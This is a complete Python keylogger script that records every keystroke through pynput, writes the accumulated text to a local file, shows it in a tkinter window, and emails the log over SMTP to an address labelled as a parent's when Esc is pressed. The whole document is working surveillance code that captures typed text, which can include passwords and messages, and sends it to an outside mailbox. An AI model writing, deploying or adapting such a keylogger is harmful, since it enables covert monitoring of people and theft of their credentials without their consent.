from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import tkinter as tk

# File to store the captured keystrokes
log_file = 'keylog.txt'

# Email configuration
smtp_server = 'smtp.example.com'
smtp_port = 587
smtp_username = 'your_email@example.com'
smtp_password = 'your_email_password'
email_from = 'your_email@example.com'
email_to = 'parent_email@example.com'
email_subject = 'Keylogger Data'

key_strokes = ''

def send_email(message):
    try:
        msg = MIMEMultipart()
        msg['From'] = email_from
        msg['To'] = email_to
        msg['Subject'] = email_subject

        msg.attach(MIMEText(message, 'plain'))

        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(email_from, email_to, msg.as_string())
        server.quit()

        print(f"Email sent successfully!")
    except Exception as e:
        print(f"Couldn't send email. Error: {e}")

def write_to_file(content):
    with open(log_file, 'a') as file:
        file.write(content)

def on_press(key):
    global key_strokes

    if key == keyboard.Key.enter:
        key_strokes += "\n"
        write_to_file(key_strokes)
    elif key == keyboard.Key.tab:
        key_strokes += "\t"
        write_to_file(key_strokes)
    elif key == keyboard.Key.space:
        key_strokes += " "
        write_to_file(key_strokes)
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(key_strokes) > 0:
        key_strokes = key_strokes[:-1]
        write_to_file(key_strokes)
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        send_email(key_strokes)
        window.quit()
        return False
    else:
        key_strokes += str(key).strip("'")
        write_to_file(key_strokes)
    
    # Update the GUI display with the current key strokes
    text_widget.configure(state='normal')
    text_widget.insert(tk.END, key_strokes + '\n')
    text_widget.configure(state='disabled')
    text_widget.see(tk.END)

def on_release(key):
    pass

# Create the GUI window
window = tk.Tk()
window.title("Keylogger")

# Create a scrollable text widget to display the captured keystrokes
text_widget = tk.Text(window, font=("Courier", 12), width=40, height=10)
text_widget.pack(padx=10, pady=10)
scrollbar = tk.Scrollbar(window)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
text_widget.config(yscrollcommand=scrollbar.set)
scrollbar.config(command=text_widget.yview)

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Print a message to indicate that the keylogger is running
    print("Keylogger started. Press Esc to send the log file and exit.")
    
    # Run the GUI event loop
    window.mainloop()
